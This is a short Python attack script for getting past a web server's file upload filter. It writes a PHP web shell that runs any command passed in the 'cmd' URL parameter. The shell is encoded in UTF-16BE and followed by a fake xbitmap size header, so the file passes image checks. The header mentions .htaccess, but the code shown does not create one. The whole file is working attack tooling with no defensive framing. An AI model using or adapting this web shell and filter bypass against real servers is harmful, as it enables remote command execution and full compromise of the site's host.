#!/usr/bin/python3
# Description : create and bypass file upload filter with .htaccess
# Author : Thibaud Robin

# Will prove the file is a legit xbitmap file and the size is 1337x1337
SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"

def generate_shell_file(filename, script):
	phpfile = open(filename, 'wb') 

	phpfile.write(script.encode('utf-16be'))
	phpfile.write(SIZE_HEADER)

	phpfile.close()

generate_shell_file("webshell.shell", "<?php system($_GET['cmd']); die(); ?>")